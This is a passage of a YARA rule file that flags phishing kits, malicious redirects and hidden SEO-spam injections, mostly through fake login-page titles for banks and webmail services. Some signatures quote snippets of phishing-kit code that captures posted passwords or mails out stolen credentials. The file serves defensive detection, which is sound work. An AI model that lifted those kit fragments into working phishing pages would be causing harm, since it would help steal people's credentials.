    strings:
        $trigger = "Login"
    condition:
        $trigger and PR00533
}

private rule PR00534 : trigger
{
    strings:
        $ps0 = "<title>ExpressVPN"
    condition:
        $ps0
}

private rule PR00535 : trigger
{
    strings:
        $ps0 = "2468.go2cloud.org/aff_ad?campaign_id=10&aff_id=1004"
    condition:
        $ps0
}

rule html_phishing_thepiratebay_001_02 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00534 and PR00535
}

private rule PR00536 : trigger
{
    strings:
        $ps0 = "iframe src=\"//ads.exoclick.com/iframe.php?idzone=522605&size=728x9"
    condition:
        $ps0
}

private rule PR00537 : trigger
{
    strings:
        $ps0 = "<title>advertisment"
    condition:
        $ps0
}

rule html_phishing_thepiratebay_001_03 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00536 and PR00537
}

rule html_phishing_UBS_001 : phishing
{
    strings:
        $trigger = "<title>Welcome to UBS e-banking</title>"
    condition:
        $trigger
}

rule html_phishing_UBS_001_02 : phishing
{
    strings:
        $trigger = "header(\"location: http://www.ubs.com/de/en.html\");"
    condition:
        $trigger
}

rule html_phishing_USAA_001 : phishing
{
    strings:
        $trigger = "| USAA</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_USAA_002 : phishing
{
    strings:
        $trigger = "Welcome to USAA</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_USAA_003 : phishing
{
    strings:
        $trigger = "<title>USAA - "
    condition:
        $trigger
}

rule html_phishing_usbank_001 : phishing
{
    strings:
        $trigger = "<span class=\"usbHomeLink\"><a href=\"http://www.usbank.com/\">U.S. Bank Home</a>"
    condition:
        $trigger
}

rule html_phishing_verizon_001 : phishing
{
    strings:
        $trigger = "<title>My Verizon Profile Updated"
    condition:
        $trigger
}

rule html_phishing_verizon_001_002 : phishing
{
    strings:
        $trigger = "<form id=\"vgnMyBizSignInForm\" action=\"https://mblogin.verizonwireless.com/amserver/UI/Login\""
    condition:
        $trigger and PR00042
}

private rule PR00538 : trigger
{
    strings:
        $ps0 = "Location:"
    condition:
        $ps0
}

rule html_phishing_verizon_001_003 : phishing
{
    strings:
        $trigger = "htm?https://login.verizonwireless.com"
    condition:
        $trigger and PR00538
}

rule html_phishing_verizon_002 : phishing
{
    strings:
        $trigger = "$subj = \"| Verizon | $ip |\";"
    condition:
        $trigger and PR00301
}

rule html_phishing_verizon_003 : phishing
{
    strings:
        $trigger = "<title>Welcome to Verizon Webmail</title>"
    condition:
        $trigger
}

private rule PR00539 : trigger
{
    strings:
        $ps0 = "Vodafone UK - Login/Register"
    condition:
        $ps0
}

rule html_phishing_vodafone_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00539
}

rule html_phishing_web_banking_001 : phishing
{
    strings:
        $trigger = "<title>winbank web banking"
    condition:
        $trigger
}

rule html_phishing_web_banking_002 : phishing
{
    strings:
        $trigger = "<title>Cash App"
    condition:
        $trigger
}

rule html_phishing_web_de_001 : phishing
{
    strings:
        $trigger = ">Ihr WEB.DE Konto wurde erfolgreich verifiziert."
    condition:
        $trigger and PR00042
}

rule html_phishing_web_de_002 : phishing
{
    strings:
        $trigger = ">WEBDE Login"
    condition:
        $trigger and PR00042
}

rule html_phishing_webmail_001 : phishing
{
    strings:
        $trigger = "form name=\"hwebmail_login\" method=\"post\" action=\"redirect.php\" autocomplete=\"on\" onsubmit=\"return validateForm"
    condition:
        $trigger and PR00281 and PR00247
}

rule html_phishing_webmail_002 : phishing
{
    strings:
        $trigger = "<title>Webmail Login<"
    condition:
        $trigger
}

rule html_phishing_webmail_003 : phishing
{
    strings:
        $trigger = "<title>Email Account | WebMail Login<"
    condition:
        $trigger
}

rule html_phishing_webmail_004 : phishing
{
    strings:
        $trigger = "Roundcube Webmail Login"
    condition:
        $trigger and PR00042
}

rule html_phishing_webmail_005 : phishing
{
    strings:
        $trigger = "<title>Sign in - Webmail Login<"
    condition:
        $trigger
}

private rule PR00540 : trigger
{
    strings:
        $ps0 = "<div"
    condition:
        $ps0
}

private rule PR00541 : trigger
{
    strings:
        $ps0 = "<a href=\"http"
    condition:
        $ps0
}

rule html_phishing_webmail_006 : phishing
{
    strings:
        $trigger = "webmail.tnc.ne.jp"
    condition:
        $trigger and PR00540 and PR00050 and PR00541
}

rule html_phishing_webmail_007 : phishing
{
    strings:
        $trigger = "Webmail | Account Login"
    condition:
        $trigger and PR00042
}

private rule PR00542 : trigger
{
    strings:
        $ps0 = "ellsfargo"
    condition:
        $ps0
}

rule html_phishing_wells_fargo_001 : phishing
{
    strings:
        $trigger = "Wells Fargo Security Measures"
    condition:
        $trigger and PR00542
}

rule html_phishing_wells_fargo_001_002 : phishing
{
    strings:
        $trigger = "Wells Fargo Sign On to View Your Busines"
    condition:
        $trigger and PR00542
}

rule html_phishing_wells_fargo_001_003 : phishing
{
    strings:
        $trigger = "message .= \"---:||Wellsfargo"
    condition:
        $trigger
}

rule html_phishing_wells_fargo_001_004 : phishing
{
    strings:
        $trigger = "HTTP-EQUIV=\"Refresh\" CONTENT=\"1;URL=https://www.wellsfargo.com\""
    condition:
        $trigger
}

rule html_phishing_wells_fargo_001_006 : phishing
{
    strings:
        $trigger = "<TITLE>Wells Fargo\xc2\xa0Online Banking Identity Verification Process"
    condition:
        $trigger
}

rule html_phishing_wells_fargo_001_007 : phishing
{
    strings:
        $trigger = ">Wells Fargo - Personal & Business Banking"
    condition:
        $trigger
}

rule html_phishing_wells_fargo_002 : phishing
{
    strings:
        $trigger = "<div class=\"titlePassword\">Wells Fargo Accounts Verification</div>"
    condition:
        $trigger and PR00542
}

rule html_phishing_wells_fargo_002_002 : phishing
{
    strings:
        $trigger = "<title>Wells Fargo&nbsp;Sign On to View Your Accounts</title>"
    condition:
        $trigger
}

rule html_phishing_wells_fargo_002_003 : phishing
{
    strings:
        $trigger = "form autocomplete=\"off\" name=\"signon\" id=\"frmSignon\" action=\"wellsfargo.php"
    condition:
        $trigger
}

rule html_phishing_wells_fargo_002_004 : phishing
{
    strings:
        $trigger = "<title>Wells Fargo&nbsp;Enter Your Security Questions"
    condition:
        $trigger
}

rule html_phishing_wells_fargo_003 : phishing
{
    strings:
        $trigger = ">Wells Fargo Confirm Your Acount Profile Information"
    condition:
        $trigger and PR00042
}

private rule PR00543 : trigger
{
    strings:
        $ps0 = "lease wait while we verify your identity...</span>"
    condition:
        $ps0
}

rule html_phishing_wells_fargo_004 : phishing
{
    strings:
        $trigger = "HTTP-EQUIV=\"Refresh\" CONTENT=\"1;URL="
    condition:
        $trigger and PR00542 and PR00543
}

rule html_phishing_wells_fargo_004_02 : phishing
{
    strings:
        $trigger = "Fargo Sign On</title"
    condition:
        $trigger and PR00542
}

private rule PR00544 : trigger
{
    strings:
        $ps0 = "<title>Wells Fargo</title>"
    condition:
        $ps0
}

rule html_phishing_wells_fargo_005 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00544
}

rule html_phishing_wells_fargo_006 : phishing
{
    strings:
        $trigger = "Wells Fargo</title>"
    condition:
        $trigger and PR00042 and PR00278
}

rule html_phishing_wells_fargo_007 : phishing
{
    strings:
        $trigger = "NMLSR ID 399801"
    condition:
        $trigger and PR00042
}

rule html_phishing_wells_fargo_008 : phishing
{
    strings:
        $trigger = "Wells Fargo. All rights reserved"
    condition:
        $trigger and PR00542
}

rule html_phishing_wells_fargo_009 : phishing
{
    strings:
        $trigger = "define('SITE_ROOT', 'https://connect.secure-wellsfargo.wfonlines.com/auth/');"
    condition:
        $trigger
}

rule html_phishing_wells_fargo_010 : phishing
{
    strings:
        $trigger = "<title>&#87;&#101;&#108;&#108;"
    condition:
        $trigger
}

rule html_phishing_wells_fargo_010_02 : phishing
{
    strings:
        $trigger = "<title>Confirm Your Identity"
    condition:
        $trigger
}

rule html_phishing_wells_fargo_011 : phishing
{
    strings:
        $trigger = "Wells Fargo. All rights reserved."
    condition:
        $trigger and PR00042
}

rule html_phishing_westernunion_001 : phishing
{
    strings:
        $trigger = "<title>Western Union Agent Gateway</title>"
    condition:
        $trigger
}

rule html_phishing_westernunion_002 : phishing
{
    strings:
        $trigger = "<title>Western Union Money Transfers - Send Money Online -"
    condition:
        $trigger
}

private rule PR00545 : trigger
{
    strings:
        $ps0 = "href=\"http://corporate.westernunion.com/index.html\" target=\"\">About us</a></li>"
    condition:
        $ps0
}

rule html_phishing_westernunion_003 : phishing
{
    strings:
        $trigger = "Western Union"
    condition:
        $trigger and PR00042 and PR00545
}

rule html_phishing_westpac_001 : phishing
{
    strings:
        $trigger = "This email is to confirm that you recently made a Funds Transfer"
    condition:
        $trigger and PR00301
}

rule html_phishing_wetransfer_001 : phishing
{
    strings:
        $trigger = "WeTransfer Plus"
    condition:
        $trigger and PR00042
}

rule html_phishing_whatsapp_001 : phishing
{
    strings:
        $trigger = "<title>[ WhatsApp]"
    condition:
        $trigger
}

rule html_phishing_wilhelm_tel_001 : phishing
{
    strings:
        $trigger = "<title>wilhelm.tel Webmail :: wilhelm.tel Webmail<"
    condition:
        $trigger and PR00301
}

rule html_phishing_windows_live_id_001 : phishing
{
    strings:
        $trigger = "<title>Windows Live ID</title>"
    condition:
        $trigger
}

private rule PR00546 : trigger
{
    strings:
        $ps0 = "form method=\"post\" action=\"post.php\""
    condition:
        $ps0
}

private rule PR00547 : trigger
{
    strings:
        $ps0 = "<title>Windows Settings"
    condition:
        $ps0
}

rule html_phishing_windows_live_id_002 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00546 and PR00547
}

private rule PR00548 : trigger
{
    strings:
        $ps0 = "wait while we update your account settings"
    condition:
        $ps0
}

private rule PR00549 : trigger
{
    strings:
        $ps0 = "<title>Email Settings"
    condition:
        $ps0
}

rule html_phishing_windows_live_id_002_02 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00548 and PR00549
}

private rule PR00550 : trigger
{
    strings:
        $ps0 = "de-activation has been cancelled"
    condition:
        $ps0
}

rule html_phishing_windows_live_id_002_03 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00550 and PR00549
}

rule html_phishing_windows_live_id_003 : phishing
{
    strings:
        $trigger = ">Windows Email Upgrade"
    condition:
        $trigger and PR00042
}

private rule PR00551 : trigger
{
    strings:
        $ps0 = "Log In | Xoom"
    condition:
        $ps0
}

rule html_phishing_xoom_001 : phishing
{
    strings:
        $trigger = "<a href=\"/online-security-and-privacy-at-xoom\""
    condition:
        $trigger and PR00042 and PR00551
}

rule html_phishing_xtramail_001 : phishing
{
    strings:
        $trigger = "<title>Xtra Mail"
    condition:
        $trigger
}

rule html_phishing_yahoo_001 : phishing
{
    strings:
        $trigger = "<meta content=\"Yahoo!"
    condition:
        $trigger
}

rule html_phishing_yahoo_001_001 : phishing
{
    strings:
        $trigger = "IDBI LOGZ"
    condition:
        $trigger and PR00080
}

rule html_phishing_yahoo_001_002 : phishing
{
    strings:
        $trigger = "<title>Sign in to Yahoo"
    condition:
        $trigger
}

private rule PR00552 : trigger
{
    strings:
        $ps0 = "Owned YAHOO ID"
    condition:
        $ps0
}

rule html_phishing_yahoo_001_003 : phishing
{
    strings:
        $trigger = "ahoo"
    condition:
        $trigger and PR00552
}

rule html_phishing_yahoo_001_004 : phishing
{
    strings:
        $trigger = "$yahoopassword = $_POST['yahoopassword"
    condition:
        $trigger
}

rule html_phishing_yahoo_001_005 : phishing
{
    strings:
        $trigger = "Yahoo! Mail: The best web-based email!"
    condition:
        $trigger
}

rule html_phishing_yahoo_001_006 : phishing
{
    strings:
        $trigger = "emailPASS=document."
    condition:
        $trigger
}

rule html_phishing_yahoo_002 : phishing
{
    strings:
        $trigger = "<b>Yahoo Alert!</b><br><br>Dear <br><br>Since you changed"
    condition:
        $trigger
}

rule html_phishing_yahoo_004 : phishing
{
    strings:
        $trigger = "<title>Yahoo! Confirmation Process |"
    condition:
        $trigger
}

rule html_phishing_yahoo_005 : phishing
{
    strings:
        $trigger = "<title>Yahoo! - Processing...</"
    condition:
        $trigger
}

private rule PR00553 : trigger
{
    strings:
        $ps0 = ":url(\"https://s.yimg.com/lq/i/reg/login/"
    condition:
        $ps0
}

rule html_phishing_yahoo_006 : phishing
{
    strings:
        $trigger = "Yahoo"
    condition:
        $trigger and PR00042 and PR00553
}

rule html_phishing_yahoo_007 : phishing
{
    strings:
        $trigger = "<title>Yahoo Mail support Update"
    condition:
        $trigger
}

rule html_phishing_yahoo_008 : phishing
{
    strings:
        $trigger = "<title>Yahoo - login"
    condition:
        $trigger
}

rule html_phishing_yahoo_009 : phishing
{
    strings:
        $trigger = "- Yahoo</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_yahoo_010 : phishing
{
    strings:
        $trigger = "<title>Yahoo! - login"
    condition:
        $trigger
}

private rule PR00554 : trigger
{
    strings:
        $ps0 = "Yahoo"
    condition:
        $ps0
}

rule html_phishing_yahoo_011 : phishing
{
    strings:
        $trigger = "<title>Account Update</title>"
    condition:
        $trigger and PR00554
}

private rule PR00555 : trigger
{
    strings:
        $ps0 = "<title>Account Confirmation"
    condition:
        $ps0
}

rule html_phishing_yahoo_013 : phishing
{
    strings:
        $trigger = "Yahoo"
    condition:
        $trigger and PR00555
}

rule html_phishing_yahoo_014 : phishing
{
    strings:
        $trigger = "<title>Verify Password</title>"
    condition:
        $trigger and PR00554
}

rule html_phishing_yahoo_015 : phishing
{
    strings:
        $trigger = "<title>Yahoo - Login"
    condition:
        $trigger
}

rule html_phishing_yahoo_016 : phishing
{
    strings:
        $trigger = "<title>Yahoo \xe2\x80\x93&nbsp;login"
    condition:
        $trigger
}

rule html_phishing_yahoo_017 : phishing
{
    strings:
        $trigger = "<title>Yahoo</title>"
    condition:
        $trigger
}

rule html_phishing_yahoo_018 : phishing
{
    strings:
        $trigger = "<title>\xe3\x83\xad\xe3\x82\xb0\xe3\x82\xa4\xe3\x83\xb3 - Yahoo"
    condition:
        $trigger
}

private rule PR00556 : trigger
{
    strings:
        $ps0 = "yahoo Login"
    condition:
        $ps0
}

rule html_phishing_yahoo_019 : phishing
{
    strings:
        $trigger = "Yahoo"
    condition:
        $trigger and PR00042 and PR00556
}

private rule PR00557 : trigger
{
    strings:
        $ps0 = "<title>Zimbra Web Client"
    condition:
        $ps0
}

rule html_phishing_zimbra_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00557
}

private rule PR00558 : trigger
{
    strings:
        $ps0 = "URL=http://google-statik.pw"
    condition:
        $ps0
}

rule html_redirect_google_static_pw_001 : redirect
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"0;"
    condition:
        $trigger and PR00558
}

rule html_redirect_httpRefresh_gen_001_02 : redirect
{
    strings:
        $trigger = "Loading.. Please Wait.<meta http-equiv=\"refresh\" content=\"0;url=http://"
    condition:
        $trigger
}

rule html_redirect_httpRefresh_gen_002 : redirect
{
    strings:
        $trigger = "                                                                          <meta http-equiv=\"refresh\" content="
    condition:
        $trigger
}

private rule PR00559 : trigger
{
    strings:
        $ps0 = "<title>S.G</title>"
    condition:
        $ps0
}

rule html_redirect_httpRefresh_gen_007 : redirect
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"0;"
    condition:
        $trigger and PR00559
}

rule html_redirect_httpRefresh_gen_009 : redirect
{
    strings:
        $trigger = "zippyshare.com"
    condition:
        $trigger and PR00528
}

rule html_spamseo_bkeyword_001 : spamseo
{
    strings:
        $trigger = "<title>[BKEYWORD]</title>"
    condition:
        $trigger
}

private rule PR00560 : trigger
{
    strings:
        $ps0 = "<p class=\"dnn\">By "
    condition:
        $ps0
}

rule html_spamseo_dnnlink_001 : spamseo
{
    strings:
        $trigger = "<a href="
    condition:
        $trigger and PR00560
}

private rule PR00561 : trigger
{
    strings:
        $ps0 = "<div id=\"fb-root\"><marquee"
    condition:
        $ps0
}

rule html_spamseo_fbmarquee_001 : spamseo
{
    strings:
        $trigger = "=\"http://"
    condition:
        $trigger and PR00561
}

rule html_spamseo_generic_001 : spamseo
{
    strings:
        $trigger = "<title>m\xc3\xa1s del 50% de descuento para comprar zapatillas Nike air max baratas.Zapatillas de"
    condition:
        $trigger
}

rule html_spamseo_generic_003 : spamseo
{
    strings:
        $trigger = "/FLP_top3.jpg\">        </a></div>  <div class=\"content\">"
    condition:
        $trigger
}

rule html_spamseo_generic_004 : spamseo
{
    strings:
        $trigger = "p.shuju2011.com"
    condition:
        $trigger
}

rule html_spamseo_generic_005 : spamseo
{
    strings:
        $trigger = "#gradcatalog\">Previous Catalog</a> | <a href=\"#\">Catalog Home</a> | <a href=\"#gradcatalog\">Graduate Students"
    condition:
        $trigger
}

rule html_spamseo_generic_006 : spamseo
{
    strings:
        $trigger = "<title>Pierwsza Po\xc5\xbcyczka online dos"
    condition:
        $trigger
}

rule html_spamseo_generic_009 : spamseo
{
    strings:
        $trigger = "<h3><a href=\"http://www.google.comrss2.html\">News</a>Last updated:"
    condition:
        $trigger and PR00050
}

private rule PR00562 : trigger
{
    strings:
        $ps0 = "<title>Adidas Yeez Boost 350 V2 'Beluga'  Info &amp; Release Date</title>"
    condition:
        $ps0
}

rule html_spamseo_generic_010 : spamseo
{
    strings:
        $trigger = "getElementById"
    condition:
        $trigger and PR00562 and PR00050
}

rule html_spamseo_generic_011 : spamseo
{
    strings:
        $trigger = "Reddit NBA"
    condition:
        $trigger and PR00042
}

rule html_spamseo_hiddendiv_001 : spamseo
{
    strings:
        $trigger = "if(document.getElementById('HiddenDiv') != null){document.getElementById('HiddenDiv')"
    condition:
        $trigger and PR00050
}

private rule PR00563 : trigger
{
    strings:
        $ps0 = "<!-- qweiop21 -->"
    condition:
        $ps0
}

rule html_spamseo_hiddendiv_002 : spamseo
{
    strings:
        $trigger = "getElementById"
    condition:
        $trigger and PR00563 and PR00050
}

rule html_spamseo_hiddendiv_005 : spamseo
{
    strings:
        $trigger = "<div style=\"position:absolute;filter:alpha(opacity=0);opacity:0.001;z-"
    condition:
        $trigger
}

rule html_spamseo_hiddendiv_010 : spamseo
{
    strings:
        $trigger = "<div style=\"position: absolute; z-index: -300; top: -2000px;\"><a href=\"http:"
    condition:
        $trigger
}

rule html_spamseo_hiddendiv_014 : spamseo
{
    strings:
        $trigger = "<div style=\"width:1px;height:1px;overflow: hidden;\"><a href=\"http://"
    condition:
        $trigger
}

rule html_spamseo_hiddendiv_015 : spamseo
{
    strings:
        $trigger = "style=\"position: absolute; left:-20860px;\">"
    condition:
        $trigger and PR00287
}

rule html_spamseo_hiddendiv_016 : spamseo
{
    strings:
        $trigger = "document.write(\"<div style='height:1px; width:1px; overflow:hidden'>\");</script>"
    condition:
        $trigger
}

rule html_spamseo_hiddendiv_017 : spamseo
{
    strings:
        $trigger = ">document.write('<d' + 'iv st' + 'yle' + '=\"po' +"
    condition:
        $trigger
}

rule html_spamseo_hiddendiv_018 : spamseo
{
    strings:
        $trigger = "<div style=\"position:absolute;left:-991"
    condition:
        $trigger
}

private rule PR00564 : trigger
{
    strings:
        $ps0 = "display:none;"
    condition:
        $ps0
}

rule html_spamseo_hiddendiv_019 : spamseo
{
    strings:
        $trigger = "<div onclick=\"(a.style.display=='none')?a.style.display='block':a.style.display='none';\"></div>"
    condition:
        $trigger and PR00564
}

private rule PR00565 : trigger
{
    strings:
        $ps0 = "\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x75\\x72\\x6c\\x2e\\x65\\x78\\x70\\x6f\\x67\\x6f\\x6c\\x66\\x2e\\x63\\x6e\\x2f\\x75\\x72\\x6c\\x2e\\x61\\x73\\x70\\x3f"
    condition:
        $ps0
}

rule html_spamseo_hiddendiv_021 : spamseo
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR00565
}

rule html_spamseo_hiddendiv_022 : spamseo
{
    strings:
        $trigger = "; position: absolute; left:-5000px; top: -5000px;"
    condition:
        $trigger and PR00287
}

private rule PR00566 : trigger
{
    strings:
        $ps0 = "position:absolute;left:-"
    condition:
        $ps0
}

rule html_spamseo_hiddenstyle_003 : spamseo
{
    strings:
        $trigger = "<script type=\"text/javascript\">var style = document.createElement(\"style\");style.appendChild(document.createTextNode(\"."
    condition:
        $trigger and PR00566
}

rule html_spamseo_hiddenstyle_003_02 : spamseo
{
    strings:
        $trigger = "<script type='text/javascript'>var style = document.createElement('style');style.appendChild(document.createTextNode('."
    condition:
        $trigger and PR00566
}

rule html_spamseo_hiddenstyle_005 : spamseo
{
    strings:
        $trigger = "<footer><nav style=\"display:none;\""
    condition:
        $trigger
}

private rule PR00567 : trigger
{
    strings:
        $ps0 = "<p class=\"clear\"></p>"
    condition:
        $ps0
}

rule html_spamseo_hiddenstyle_006 : spamseo
{
    strings:
        $trigger = "<style>.clear + p{left:-"
    condition:
        $trigger and PR00567
}

private rule PR00568 : trigger
{
    strings:
        $ps0 = ");}zdrViewState();"
    condition:
        $ps0
}

rule html_spamseo_hiddenstyle_007 : spamseo
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR00568
}

private rule PR00569 : trigger
{
    strings:
        $ps0 = "<p style=\"position:absolute; display:none;\">"
    condition:
        $ps0
}

rule html_spamseo_hiddenstyle_008 : spamseo
{
    strings:
        $trigger = ">porno<"
    condition:
        $trigger and PR00569
}

private rule PR00570 : trigger
{
    strings:
        $ps0 = "{ return \"none\"; } function end"
    condition:
        $ps0
}

rule html_spamseo_hiddenstyle_009 : spamseo
{
    strings:
        $trigger = "function get_style"
    condition:
        $trigger and PR00570 and PR00050 and PR00323
}

private rule PR00571 : trigger
{
    strings:
        $ps0 = "function get_style"
    condition:
        $ps0
}

private rule PR00572 : trigger
{
    strings:
        $ps0 = "} function end"
    condition:
        $ps0
}

rule html_spamseo_hiddenstyle_009_02 : spamseo
{
    strings:
        $trigger = "<script type=\"text/javascript\"> end"
    condition:
        $trigger and PR00323 and PR00571 and PR00572
}

private rule PR00573 : trigger
{
    strings:
        $ps0 = "styl"
    condition:
        $ps0
}

rule html_spamseo_hiddenstyle_010 : spamseo
{
    strings:
        $trigger = "duckporno"
    condition:
        $trigger and PR00573
}

// MANUAL FIX NECESSARY
rule html_spamseo_hiddenstyle_018 : spamseo
{
    strings:
        $trigger = "<div style="
        $html_spamseo_hiddenstyle_018_r0 = /<div style=.display: none[^\n]+\W(cialis|pills|buy-cheap|viagra)\W[^>]+<.div>/
    condition:
        $trigger and $html_spamseo_hiddenstyle_018_r0
}

// MANUAL FIX NECESSARY
rule html_spamseo_hiddenstyle_019 : spamseo
{
    strings:
        $trigger = "<div style="
        $html_spamseo_hiddenstyle_019_r0 = /<div style=.position: absolute[^\n]+\W(cialis|pills|buy-cheap|viagra|montelukast|[Rr]eplica|rolex)\W[^\n]+\W((cialis|pills|buy-cheap|viagra|montelukast|[Rr]eplica|rolex)\W[^\n]+)?<.div>/
    condition:
        $trigger and $html_spamseo_hiddenstyle_019_r0
}

// MANUAL FIX NECESSARY
rule html_spamseo_hiddenstyle_021 : spamseo
{
    strings:
        $trigger = "<div style="
        $html_spamseo_hiddenstyle_021_r0 = /<div\s*style\s*=\s*.overflow:hidden;height:\s*-?\d+px;\s*.>(\n+)?\s*<a\s*href=.https?:\/\/[^\/]+\/.\s*title\s*=\s*.((cialis|pills|buy-cheap|viagra|montelukast|[Rr]eplica|rolex|futbalove\s*dresy|student-loan|home-well-water|work-from-home|payroll-loan|viagra|cheap|zithromax|pharmacy|buy|cheap))\W[^\n]+\W((cialis|pills|buy-cheap|viagra|montelukast|[Rr]eplica|rolex|futbalove\s*dresy|student-loan|home-well-water|work-from-home|payroll-loan|viagra|cheap|zithromax|pharmacy|buy|cheap)\W[^\n]+)?<\/div>/
    condition:
        $trigger and $html_spamseo_hiddenstyle_021_r0
}

// MANUAL FIX NECESSARY
rule html_spamseo_hiddenstyle_022 : spamseo
{
    strings:
        $trigger = "<p style"
        $html_spamseo_hiddenstyle_022_r0 = /<p style=.position:\s*absolute;\s*left:\s*-\d+px;\s*top:\s*-\d+px;.>([\s\w,+]+\<a href=.[^<]+(\s*\w+\s*)+<.a>)+[^>]+<.p>/
    condition:
        $trigger and $html_spamseo_hiddenstyle_022_r0
}

// MANUAL FIX NECESSARY
rule html_spamseo_hiddenstyle_023 : spamseo
{
    strings:
        $trigger = "<u style"
        $html_spamseo_hiddenstyle_023_r0 = /<u\s*style=.position:absolute;(right|left|top|bottom):-?\d{4,}px/
        $html_spamseo_hiddenstyle_023_r1 = /<u\s*style=.position:absolute;(right|left|top|bottom):-?\d{4,}px[^<]+(<a href=.http[^>]+\W([oO]nline|viagra|cialis|tadafil)\W[^>]+<.a>\s*)+<.u>/
    condition:
        $trigger and $html_spamseo_hiddenstyle_023_r0 and $html_spamseo_hiddenstyle_023_r1
}

rule html_spamseo_HiddenMarquee_001 : spamseo
{
    strings:
        $trigger = "<marquee style=\"position: absolute; width: 0px;\">"
    condition:
        $trigger
}

private rule PR00574 : trigger
{
    strings:
        $ps0 = "hydra"
    condition:
        $ps0
}

rule html_spamseo_hydra_001 : spamseo
{
    strings:
        $trigger = "<title>Hydra onion"
    condition:
        $trigger and PR00574
}

rule html_spamseo_hydra_001_02 : spamseo
{
    strings:
        $trigger = "<title>Hydra shop"
    condition:
        $trigger and PR00574
}

rule html_spamseo_hydra_001_03 : spamseo
{
    strings:
        $trigger = "<title>\xd0\x90\xd0\xbd\xd0\xbe\xd0\xbd\xd0\xb8\xd0\xbc\xd0\xbd\xd0\xbe\xd1\x81\xd1\x82\xd1\x8c \xd0\xb1\xd0\xb8\xd1\x82\xd0\xba\xd0\xbe\xd0\xb8\xd0\xbd\xd0\xb0"
    condition:
        $trigger and PR00574
}

rule html_spamseo_hydra_001_04 : spamseo
{
    strings:
        $trigger = "<title>Best Bitcoin Mixers"
    condition:
        $trigger and PR00574
}

rule html_spamseo_hydra_001_05 : spamseo
{
    strings:
        $trigger = "\">\xd0\x9f\xd0\xb5\xd1\x80\xd0\xb5\xd0\xb9\xd1\x82\xd0\xb8 \xd0\xbd\xd0\xb0 \xd0\x93\xd0\xb8\xd0\xb4\xd1\x80\xd0\xb0</a>"
    condition:
        $trigger and PR00042 and PR00574
}

rule html_spamseo_hydra_001_06 : spamseo
{
    strings:
        $trigger = "<title>\xd0\x93\xd0\xb8\xd0\xb4\xd1\x80\xd0\xb0 \xd0\xbe\xd1\x82\xd0\xb7\xd1\x8b\xd0\xb2\xd1\x8b \xd0\xbe \xd0\xbc\xd0\xb0\xd0\xb3\xd0\xb0\xd0\xb7\xd0\xb8\xd0\xbd\xd0\xb5"
    condition:
        $trigger and PR00574
}

rule html_spamseo_hydra_001_07 : spamseo
{
    strings:
        $trigger = "\xd0\xb9\xd1\x82\xd0\xb0 - HYDRA</title>"
    condition:
        $trigger and PR00042 and PR00574
}

private rule PR00575 : trigger
{
    strings:
        $ps0 = "110,101,114,72,84,77,76,34,93,32,61,32,34,60,105,102,114,97,109,101,32,119,105,"
    condition:
        $ps0
}

rule html_spamseo_iframedoorway_001 : spamseo
{
    strings:
        $trigger = "var str2 = String.fromCharCode(40,102,117,110,99,116,105,111,110,40,97,114,103,"
    condition:
        $trigger and PR00029 and PR00575
}

rule html_spamseo_iframer_002 : spamseo
{
    strings:
        $trigger = "</iframe>\";<?php get_header();"
    condition:
        $trigger
}

rule html_spamseo_iframer_004 : spamseo
{
    strings:
        $trigger = "<iframe style='opacity: 0;visibility: hidden;border: 0;outline: 0;width: 0;height: 0"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR00576 : trigger
{
    strings:
        $ps0 = "Twitter"
    condition:
        $ps0
}

rule html_spamseo_iframer_005 : spamseo
{
    strings:
        $trigger = "document.write('<iframe"
        $html_spamseo_iframer_005_r0 = /name=.?Twitter.? scrolling=.?auto.?/
    condition:
        $trigger and PR00576 and $html_spamseo_iframer_005_r0
}

// MANUAL FIX NECESSARY
private rule PR00577 : trigger
{
    strings:
        $ps0 = "hidden;"
    condition:
        $ps0
}

private rule PR00578 : trigger
{
    strings:
        $ps0 = "none;"
    condition:
        $ps0
}

rule html_spamseo_iframer_006 : spamseo
{
    strings:
        $trigger = "<ifram"
        $html_spamseo_iframer_006_r0 = /<iframe[^>]+visibility:[\s]*hidden;[^>]*display:[\s]*none;[^>]+\.php\?id=\{/
    condition:
        $trigger and PR00577 and PR00578 and $html_spamseo_iframer_006_r0
}

// MANUAL FIX NECESSARY
rule html_spamseo_iframer_007 : spamseo
{
    strings:
        $trigger = "<iframe src="
        $html_spamseo_iframer_007_r0 = /<iframe src=\"http[^<>]*\.cgi\?\d\"/
    condition:
        $trigger and $html_spamseo_iframer_007_r0
}

// MANUAL FIX NECESSARY
rule html_spamseo_iframer_008 : spamseo
{
    strings:
        $trigger = "<iframe src="
        $html_spamseo_iframer_008_r0 = /<iframe src=\"http\S+\/counter\.php\"/
    condition:
        $trigger and $html_spamseo_iframer_008_r0
}

// MANUAL FIX NECESSARY
rule html_spamseo_iframer_009 : spamseo
{
    strings:
        $trigger = "<iframe src="
        $html_spamseo_iframer_009_r0 = /<iframe src=\"http:[^:]+(cn|ru):8080.index.php\" width=\d+ height=\d+ style=\"visibility: hidden\"><.iframe>/
    condition:
        $trigger and $html_spamseo_iframer_009_r0
}

private rule PR00579 : trigger
{
    strings:
        $ps0 = ";</a><a href=\"http:"
    condition:
        $ps0
}

private rule PR00580 : trigger
{
    strings:
        $ps0 = "</script><!-------"
    condition:
        $ps0
}

rule html_spamseo_injector_001 : spamseo
{
    strings:
        $trigger = "<span class=\"mylinkcode\" style=\"display:none\"><script src=\"http:"
    condition:
        $trigger and PR00579 and PR00580
}

private rule PR00581 : trigger
{
    strings:
        $ps0 = "wp-content/cache/"
    condition:
        $ps0
}

private rule PR00582 : trigger
{
    strings:
